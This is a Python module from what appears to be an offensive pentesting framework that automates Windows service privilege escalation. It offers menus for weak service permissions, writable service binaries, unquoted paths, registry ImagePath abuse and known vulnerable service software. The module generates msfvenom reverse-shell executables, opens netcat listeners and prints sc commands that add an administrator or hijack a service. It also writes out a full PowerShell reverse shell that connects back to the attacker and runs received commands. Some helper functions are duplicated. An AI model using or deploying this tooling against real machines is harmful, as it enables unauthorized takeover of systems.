import shutil
import subprocess
from pathlib import Path

from modules.upload.windows import stage_windows_files
from core.attacker import resolve_lhost
import yaml


# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
W_BOLD = '\033[1m'

# =========================================================
# PATHS
# =========================================================

BASE_DIR = Path(__file__).resolve().parents[3]

TOOLS_DIR = (
    BASE_DIR /
    "tools"
)

PAYLOAD_DIR = (
    BASE_DIR /
    "payloads" /
    "windows" /
    "services"
)

PAYLOAD_DIR.mkdir(
    parents=True,
    exist_ok=True,
)

SHARPUP = (
    TOOLS_DIR /
    "SharpUp.exe"
)

SERVICES_EXPLOIT_DIR = (
    BASE_DIR /
    "exploits" /
    "windows" /
    "services"
)

# =========================================================
# HELPERS
# =========================================================

def start_listener(port):

    try:

        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                f"nc -lvnp {port}"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(
            f"\n{G}[+]{W} "
            f"Listener started on "
            f"{Y}{port}{W}"
        )

        return True

    except Exception as e:

        print(
            f"\n{R}[!] Failed to start listener:{W} {e}"
        )

        return False


def generate_payload(lhost, lport):

    payload = (
        PAYLOAD_DIR /
        "revshell.exe"
    )

    cmd = [

        "msfvenom",

        "-p",
        "windows/x64/shell_reverse_tcp",

        f"LHOST={lhost}",
        f"LPORT={lport}",

        "-f",
        "exe",

        "-o",
        str(payload),

    ]

    print(
        f"\n{B}[*]{W} "
        f"GENERATING PAYLOAD"
    )

    try:

        subprocess.run(
            cmd,
            check=True,
        )

    except Exception as e:

        print(
            f"\n{R}[!] "
            f"msfvenom failed:{W} {e}"
        )

        return None

    print(
        f"\n{G}[+]{W} "
        f"Payload generated"
    )

    print(f"  {payload}")

    return payload


def ask_service():

    try:

        service = input(
            f"\n{B}service{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return None

    if not service:
        return None

    return service


# =========================================================
# ENUMERATION
# =========================================================

def enum_services():

    print(
        f"\n{W_BOLD}"
        f"[*] SERVICE ENUMERATION{W}"
    )

    if SHARPUP.exists():

        print(
            f"\n{B}[*]{W} "
            f"TRANSFERRING SHARPUP"
        )

        stage_windows_files([
            str(SHARPUP)
        ])

    else:

        print(
            f"\n{R}[!] "
            f"SharpUp.exe not found:{W}"
        )

        print(f"  {SHARPUP}")

    print(
        f"\n{G}"
        f"┌── ENUMERATE SERVICES "
        f"────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f".\\SharpUp.exe audit"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{Y}"
        f"┌── MATCH FINDINGS TO ATTACKS "
        f"──────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f"=== Modifiable Services ==="
    )

    print(
        f"{Y}│{W} "
        f"  → [2] Weak service permissions"
    )

    print(
        f"{Y}│{W} "
        f"=== Modifiable Service Binaries ==="
    )

    print(
        f"{Y}│{W} "
        f"  → [3] Writable service binary"
    )

    print(
        f"{Y}│{W} "
        f"Unquoted service paths"
    )

    print(
        f"{Y}│{W} "
        f"  → [4] Unquoted service paths"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{G}"
        f"┌── ACCESSCHK "
        f"──────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"accesschk.exe /accepteula -quvcw SERVICE"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{G}"
        f"┌── UNQUOTED SERVICE PATHS "
        f"────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f'wmic service get '
        f'name,displayname,pathname,startmode '
        f'| findstr /i "auto" '
        f'| findstr /i /v "c:\\windows\\\\" '
        f'| findstr /i /v """'
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# WEAK SERVICE PERMISSIONS
# =========================================================

def weak_service_permissions(args):

    service = ask_service()

    if not service:
        return

    print(
        f"\n{B}[*]{W} "
        f"WEAK SERVICE PERMISSIONS\n"
    )

    print(
        f"  {B}├──{W} "
        f"[1] Add local admin"
    )

    print(
        f"  {B}└──{W} "
        f"[2] Reverse shell"
    )

    try:

        choice = input(
            f"\n{B}select{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return

    # =====================================================
    # ADD ADMIN
    # =====================================================

    if choice == "1":

        username = input(
            f"\n{B}username{W}> "
        ).strip()

        print(
            f"\n{G}"
            f"┌── MODIFY SERVICE "
            f"────────────────────────────────┐{W}"
        )

        print(
            f"{G}│{W} "
            f"sc config {service} "
            f'binPath= "cmd /c net localgroup '
            f'Administrators {username} /add"'
        )

        print(
            f"{G}│{W} "
            f"sc stop {service}"
        )

        print(
            f"{G}│{W} "
            f"sc start {service}"
        )

        print(
            f"{G}"
            f"└──────────────────────────────────────────────────┘{W}"
        )

        print(
            f"\n{Y}"
            f"┌── REFRESH TOKEN "
            f"──────────────────────────────────┐{W}"
        )

        print(
            f"{Y}│{W} "
            f"runas /user:{username} powershell"
        )

        print(
            f"{Y}"
            f"└──────────────────────────────────────────────────┘{W}"
        )

    # =====================================================
    # REVSHELL
    # =====================================================

    elif choice == "2":

        lhost = resolve_lhost(args)

        lport = 4444

        if not lhost:
            return

        payload = generate_payload(
            lhost,
            lport,
        )

        if not payload:
            return

        start_listener(lport)

        print(
            f"\n{B}[*]{W} "
            f"STARTING TRANSFER"
        )

        stage_windows_files(
            [str(payload)],

            remote_dir=(
                r"C:\Users\Public"
            )
        )

        print(
            f"\n{G}"
            f"┌── MODIFY SERVICE "
            f"────────────────────────────────┐{W}"
        )

        print(
            f"{G}│{W} "
            f'sc config {service} '
            f'binPath= "C:\\Users\\Public\\revshell.exe"'
        )

        print(
            f"{G}│{W} "
            f"sc stop {service}"
        )

        print(
            f"{G}│{W} "
            f"sc start {service}"
        )

        print(
            f"{G}"
            f"└──────────────────────────────────────────────────┘{W}"
        )


# =========================================================
# WRITABLE SERVICE BINARY
# =========================================================

def writable_service_binary(args):

    service = ask_service()

    if not service:
        return

    binary = input(
        f"\n{B}service binary path{W}> "
    ).strip()

    if not binary:
        return

    lhost = resolve_lhost(args)

    lport = 4444

    if not lhost:
        return

    payload = generate_payload(
        lhost,
        lport,
    )

    if not payload:
        return

    start_listener(lport)

    print(
        f"\n{B}[*]{W} "
        f"STARTING TRANSFER"
    )

    stage_windows_files([
        str(payload)
    ])

    filename = Path(binary).name

    print(
        f"\n{G}"
        f"┌── BACKUP ORIGINAL "
        f"────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f'copy "{binary}" "{binary}.bak"'
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{G}"
        f"┌── REPLACE BINARY "
        f"────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f'copy /Y revshell.exe "{binary}"'
    )

    print(
        f"{G}│{W} "
        f"sc stop {service}"
    )

    print(
        f"{G}│{W} "
        f"sc start {service}"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# UNQUOTED SERVICE PATHS
# =========================================================

def unquoted_service_paths():

    print(
        f"\n{W_BOLD}"
        f"[*] UNQUOTED SERVICE PATHS{W}"
    )

    print(
        f"\n{G}"
        f"┌── ENUMERATE "
        f"────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f'wmic service get '
        f'name,displayname,pathname,startmode '
        f'| findstr /i "auto" '
        f'| findstr /i /v "c:\\windows\\\\" '
        f'| findstr /i /v """'
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{Y}"
        f"┌── EXAMPLE "
        f"───────────────────────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f"C:\\Program Files\\Vendor\\Service.exe"
    )

    print(
        f"{Y}│{W} "
        f"Potential hijack:"
    )

    print(
        f"{Y}│{W} "
        f"C:\\Program.exe"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# REGISTRY IMAGEPATH
# =========================================================

def registry_imagepath(args):

    service = ask_service()

    if not service:
        return

    lhost = resolve_lhost(args)

    lport = 4444

    if not lhost:
        return

    payload = generate_payload(
        lhost,
        lport,
    )

    if not payload:
        return

    start_listener(lport)

    print(
        f"\n{B}[*]{W} "
        f"STARTING TRANSFER"
    )

    stage_windows_files([
        str(payload)
    ])

    print(
        f"\n{G}"
        f"┌── MODIFY REGISTRY "
        f"────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"Set-ItemProperty "
        f"-Path "
        f"HKLM:\\SYSTEM\\CurrentControlSet\\"
        f"Services\\{service} "
        f'-Name "ImagePath" '
        f'-Value "C:\\Users\\Public\\revshell.exe"'
    )

    print(
        f"{G}│{W} "
        f"sc stop {service}"
    )

    print(
        f"{G}│{W} "
        f"sc start {service}"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

def load_service_exploits():

    exploits = []

    if not SERVICES_EXPLOIT_DIR.exists():
        return exploits

    for folder in SERVICES_EXPLOIT_DIR.iterdir():

        if not folder.is_dir():
            continue

        meta = folder / "meta.yaml"

        if not meta.exists():
            continue

        try:

            with open(meta, "r") as f:

                data = yaml.safe_load(f)

            data["_folder"] = folder

            exploits.append(data)

        except Exception as e:

            print(
                f"\n{R}[!] "
                f"Failed loading:{W} {meta}"
            )

            print(f"  {e}")

    return exploits


# =========================================================
# VULNERABLE SERVICE SOFTWARE
# =========================================================

import yaml
import subprocess

SERVICES_EXPLOIT_DIR = (
    BASE_DIR /
    "exploits" /
    "windows" /
    "services"
)


def load_service_exploits():

    exploits = []

    if not SERVICES_EXPLOIT_DIR.exists():
        return exploits

    for folder in SERVICES_EXPLOIT_DIR.iterdir():

        if not folder.is_dir():
            continue

        meta = folder / "meta.yaml"

        if not meta.exists():
            continue

        try:

            with open(meta, "r") as f:

                data = yaml.safe_load(f)

            data["_folder"] = folder

            exploits.append(data)

        except Exception as e:

            print(
                f"\n{R}[!] Failed loading:{W} {meta}"
            )

            print(f"  {e}")

    return exploits


def start_listener(port):

    try:

        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                f"nc -lvnp {port}"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(
            f"\n{G}[+]{W} "
            f"Listener started on "
            f"{Y}{port}{W}"
        )

        return True

    except Exception as e:

        print(
            f"\n{R}[!] Failed to start listener:{W} {e}"
        )

        return False


def vulnerable_service_software(args):

    exploits = load_service_exploits()

    if not exploits:

        print(
            f"\n{R}[!] "
            f"No vulnerable service exploits found.{W}"
        )

        return

    print(
        f"\n{W_BOLD}"
        f"[*] VULNERABLE SERVICE SOFTWARE{W}"
    )

    print(
        f"\n{B}[*]{W} "
        f"OPTIONS\n"
    )

    print(
        f"  {B}├──{W} [1] Browse known vulnerable services"
    )

    print(
        f"  {B}└──{W} [2] Paste installed services/software"
    )

    try:

        mode = input(
            f"\n{B}select{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return

    selected = None

    # =====================================================
    # BROWSE
    # =====================================================

    if mode == "1":

        print(
            f"\n{W_BOLD}"
            f"[*] AVAILABLE SERVICE EXPLOITS{W}\n"
        )

        for i, exploit in enumerate(exploits, start=1):

            print(
                f"  {B}[{i}]{W} "
                f"{exploit.get('name')}"
            )

        try:

            choice = input(
                f"\n{B}select{W}> "
            ).strip()

        except (KeyboardInterrupt, EOFError):

            print()

            return

        if not choice.isdigit():
            return

        idx = int(choice) - 1

        if idx < 0 or idx >= len(exploits):
            return

        selected = exploits[idx]

    # =====================================================
    # MATCH INSTALLED SOFTWARE
    # =====================================================

    elif mode == "2":

        print(
            f"\n{B}paste installed services/software{W}"
        )

        print(
            f"\n(empty line to stop)\n"
        )

        lines = []

        while True:

            try:

                line = input("> ")

            except (KeyboardInterrupt, EOFError):

                print()

                return

            if not line.strip():
                break

            lines.append(
                line.strip()
            )

        if not lines:
            return

        data = "\n".join(
            lines
        ).lower()

        matches = []

        for exploit in exploits:

            for keyword in exploit.get(
                "match",
                []
            ):

                if keyword.lower() in data:

                    matches.append(
                        exploit
                    )

                    break

        if not matches:

            print(
                f"\n{R}[!] "
                f"No vulnerable services matched.{W}"
            )

            return

        print(
            f"\n{W_BOLD}"
            f"[*] MATCHES{W}\n"
        )

        for i, exploit in enumerate(matches, start=1):

            print(
                f"  {B}[{i}]{W} "
                f"{exploit.get('name')}"
            )

        try:

            choice = input(
                f"\n{B}select{W}> "
            ).strip()

        except (KeyboardInterrupt, EOFError):

            print()

            return

        if not choice.isdigit():
            return

        idx = int(choice) - 1

        if idx < 0 or idx >= len(matches):
            return

        selected = matches[idx]

    else:

        return

    # =====================================================
    # DISPLAY
    # =====================================================

    print(
        f"\n{G}"
        f"┌── EXPLOIT "
        f"─────────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"name: "
        f"{selected.get('name')}"
    )

    if selected.get("description"):

        print(
            f"{G}│{W} "
            f"{selected.get('description')}"
        )

    if selected.get("type"):

        print(
            f"{G}│{W} "
            f"type: "
            f"{selected.get('type')}"
        )

    if selected.get("ports"):

        print(
            f"{G}│{W} "
            f"ports: "
            f"{', '.join(map(str, selected.get('ports')))}"
        )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    # =====================================================
    # LISTENER
    # =====================================================

    listener = selected.get(
        "listener"
    )

    lhost = resolve_lhost(args)

    if (
        selected.get("reverse_shell")
        and listener
    ):

        lport = listener.get(
            "lport",
            4444
        )

        start_listener(
            lport
        )

    # =====================================================
    # PATCH SHELL.PS1
    # =====================================================


    # =====================================================
    # BUILD FILES
    # =====================================================

    files = []

    for file in selected.get(
        "files",
        []
    ):

        # ================================================
        # DYNAMIC shell.ps1
        # ================================================

        if file.lower() == "shell.ps1":

            listener = selected.get(
                "listener",
                {}
            )

            lport = listener.get(
                "lport",
                4444
            )

            shell_content = f"""
    $client = New-Object System.Net.Sockets.TCPClient(
        "{lhost}",
        {lport}
    )

    $stream = $client.GetStream()

    [byte[]]$bytes = 0..65535|%{{0}}

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {{
        $data = (
            New-Object -TypeName System.Text.ASCIIEncoding
        ).GetString($bytes,0,$i)

        $sendback = (
            iex $data 2>&1 | Out-String
        )

        $sendback2 = $sendback + "PS " + (pwd).Path + "> "

        $sendbyte = (
            [text.encoding]::ASCII
        ).GetBytes($sendback2)

        $stream.Write(
            $sendbyte,
            0,
            $sendbyte.Length
        )

        $stream.Flush()
    }}

    $client.Close()
    """

            generated_shell = (
                selected["_folder"] /
                "shell.ps1"
            )

            try:

                generated_shell.write_text(
                    shell_content
                )

                files.append(
                    str(generated_shell)
                )

            except Exception as e:

                print(
                    f"\n{R}[!] Failed generating shell.ps1:{W}"
                )

                print(f"  {e}")

            continue

        # ================================================
        # STATIC FILES
        # ================================================

        path = (
            selected["_folder"] /
            file
        )

        if not path.exists():

            print(
                f"\n{R}[!] File not found:{W}"
            )

            print(f"  {path}")

            continue

        files.append(
            str(path)
        )    

    # =====================================================
    # TRANSFER
    # =====================================================

    if files:

        print(
            f"\n{B}[*]{W} "
            f"STARTING TRANSFER"
        )

        stage_windows_files(
            files
        )

    # =====================================================
    # WORKFLOW
    # =====================================================

    workflow = selected.get(
        "workflow",
        []
    )

    if workflow:

        print(
            f"\n{B}[*]{W} "
            f"WORKFLOW\n"
        )

        for i, step in enumerate(workflow, start=1):

            print(
                f"  {B}[{i}]{W} "
                f"{step}"
            )

    # =====================================================
    # COMMANDS
    # =====================================================

    commands = selected.get(
        "commands",
        []
    )

    if commands:

        print(
            f"\n{B}[*]{W} "
            f"COMMANDS\n"
        )

        for cmd in commands:

            print(
                f"{G}"
                f"┌──────────────────────────────────────────────┐{W}"
            )

            print(
                f"{G}│{W} "
                f"{cmd}"
            )

            print(
                f"{G}"
                f"└──────────────────────────────────────────────┘{W}\n"
            )

    # =====================================================
    # REFERENCES
    # =====================================================

    refs = selected.get(
        "references",
        []
    )

    if refs:

        print(
            f"\n{B}[*]{W} "
            f"REFERENCES\n"
        )

        for ref in refs:

            print(
                f"  {Y}→{W} "
                f"{ref}"
            )

# =========================================================
# CLEANUP
# =========================================================

def cleanup():

    service = ask_service()

    if not service:
        return

    original = input(
        f"\n{B}original binary path{W}> "
    ).strip()

    if not original:
        return

    print(
        f"\n{G}"
        f"┌── RESTORE SERVICE "
        f"────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f'sc config {service} '
        f'binPath= "{original}"'
    )

    print(
        f"{G}│{W} "
        f"sc stop {service}"
    )

    print(
        f"{G}│{W} "
        f"sc start {service}"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# MAIN
# =========================================================

def run(data=None, cred=None, args=None):

    print(
        f"\n{W_BOLD}"
        f"[*] WINDOWS SERVICES ABUSE{W}"
    )

    print(
        f"\n{B}[*]{W} "
        f"ATTACKS\n"
    )

    print(
        f"  {B}├──{W} [1] Enumerate vulnerable services"
    )

    print(
        f"  {B}├──{W} [2] Weak service permissions"
    )

    print(
        f"  {B}├──{W} [3] Writable service binary"
    )

    print(
        f"  {B}├──{W} [4] Unquoted service paths"
    )

    print(
        f"  {B}├──{W} [5] Registry ImagePath abuse"
    )

    print(
       f"  {B}├──{W} [6] Vulnerable service software"
    )


    print(
        f"  {B}└──{W} [7] Cleanup"
    )

    try:

        choice = input(
            f"\n{B}select{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return data

    # =====================================================
    # ENUMERATION
    # =====================================================

    if choice == "1":

        enum_services()

    # =====================================================
    # WEAK SERVICE PERMISSIONS
    # =====================================================

    elif choice == "2":

        weak_service_permissions(args)

    # =====================================================
    # WRITABLE SERVICE BINARY
    # =====================================================

    elif choice == "3":

        writable_service_binary(args)

    # =====================================================
    # UNQUOTED SERVICE PATHS
    # =====================================================

    elif choice == "4":

        unquoted_service_paths()

    # =====================================================
    # REGISTRY IMAGEPATH
    # =====================================================

    elif choice == "5":

        registry_imagepath(args)


    # =========================================================
    # VULNERABLE SERVICE SOFTWARE
    # =========================================================

    elif choice == "6":

            vulnerable_service_software(args)

    # =====================================================
    # CLEANUP
    # =====================================================

    elif choice == "7":

        cleanup()

    return data